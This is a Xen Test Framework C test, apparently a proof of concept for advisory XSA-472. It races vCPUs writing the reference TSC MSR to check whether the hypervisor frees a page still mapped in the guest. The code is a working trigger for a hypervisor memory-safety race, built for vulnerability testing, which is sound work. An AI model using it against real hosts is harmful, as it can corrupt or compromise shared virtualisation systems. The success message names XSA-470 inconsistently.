/**
 * @file tests/xsa-472-3/main.c
 * @ref test-xsa-472-3
 *
 * @page test-xsa-472-3 XSA-472 Reference TSC page leak
 *
 * Advisory: [XSA-472](https://xenbits.xen.org/xsa/advisory-472.html)
 *
 * Handling of the reference TSC page is racy, which can lead to the page being
 * freed while still being part of the guest p2m.
 *
 * @see tests/xsa-472-3/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-472-3 PoC";

static uint8_t tsc_page[PAGE_SIZE] __page_aligned_bss;

#define HV_X64_MSR_REFERENCE_TSC 0x40000021

/* Max number of iterations. */
#define MAX_ITER 100

#define NR_APS 2

/*
 * BSP waits for ready* to become the AP count, writes start*, and resets
 * state for the next phase.
 *
 * APs atomic inc read*, and wait on start*.
 */
static volatile struct {
    unsigned int ready1;
    unsigned int ready2;
    bool start1;
    bool start2;
} wait;

static void ap_thread(void)
{
    for ( ;; )
    {
        /*
         * Use LFENCE rather than PAUSE for throttling, to avoid triggering
         * Pause-Loop Exiting and having part of the race condition
         * de-scheduled by Xen.
         */

        asm volatile ("lock addl $1, %0" : "+m" (wait.ready1));
        while ( wait.start1 == 0 )
            rmb();

        wrmsr(HV_X64_MSR_REFERENCE_TSC, 0);

        asm volatile ("lock addl $1, %0" : "+m" (wait.ready2));
        while ( wait.start2 == 0 )
            rmb();
    }
}

static bool launch_aps(void)
{
    static uint8_t stack[PAGE_SIZE * NR_APS] __page_aligned_bss;

    struct xen_vcpu_hvm_context ap = {
        /* 32bit Flat Mode */
        .mode = VCPU_HVM_MODE_32B,
        .cpu_regs.x86_32 = {
            .eip = _u(&ap_thread),

            /* Same as BSP */
            .cr0 = read_cr0(),
            .cr4 = read_cr4(),

            .cs_limit = ~0U,
            .ds_limit = ~0U,
            .ss_limit = ~0U,
            .es_limit = ~0U,
            .tr_limit = 0x67,

            .cs_ar = 0xc9b,
            .ds_ar = 0xc93,
            .ss_ar = 0xc93,
            .es_ar = 0xc93,
            .tr_ar = 0x08b,
        },
    };

    for ( unsigned int cpu = 1; cpu <= NR_APS; ++cpu )
    {
        int rc;

        ap.cpu_regs.x86_32.esp = _u(stack) + cpu * PAGE_SIZE;

        rc = hypercall_vcpu_op(VCPUOP_initialise, cpu, &ap);

        if ( rc )
        {
            xtf_error("Error: unable to init CPU%u: %d\n", cpu, rc);
            return false;
        }

        rc = hypercall_vcpu_op(VCPUOP_up, cpu, NULL);
        if ( rc )
        {
            xtf_error("Error: unable to start CPU%u: %d\n", cpu, rc);
            return false;
        }
    }

    return true;
}

void test_main(void)
{
    unsigned long tsc_gfn = virt_to_gfn(tsc_page);
    unsigned long extents[] = { tsc_gfn };
    struct xen_memory_reservation mem = {
        .extent_start = extents,
        .nr_extents = ARRAY_SIZE(extents),
        .domid = DOMID_SELF,
    };

    if ( !launch_aps() )
        return;

    for ( unsigned int i = 0; i < MAX_ITER; i++ )
    {
        long rc;

        while ( wait.ready1 < NR_APS )
            rmb();

        wait.ready2 = 0;
        wait.start2 = false;

        wrmsr(HV_X64_MSR_REFERENCE_TSC, _u(tsc_page) | 1);

        wait.start1 = true;

        while ( wait.ready2 < NR_APS )
            rmb();

        wait.ready1 = 0;
        wait.start1 = false;

        wait.start2 = true;

        /*
         * Test whether the page is still assigned to the domain by attempting
         * to balloon it out: if the page has been freed the get_page() call
         * done in XENMEM_decrease_reservation will fail.
         */
        rc = hypercall_memory_op(XENMEM_decrease_reservation, &mem);
        if ( rc != 1 )
            return xtf_failure("Fail: Vulnerable to XSA-472 (CVE-2025-58143)\n");

        /*
         * Re-populate in preparation for the next run.
         */
        rc = hypercall_memory_op(XENMEM_populate_physmap, &mem);
        if ( rc != 1 )
            return xtf_error("Error: cannot populate gfn %lx: %ld\n", tsc_gfn, rc);
    }

    xtf_success("Success: Probably not vulnerable to XSA-470 (CVE-2025-58143)\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
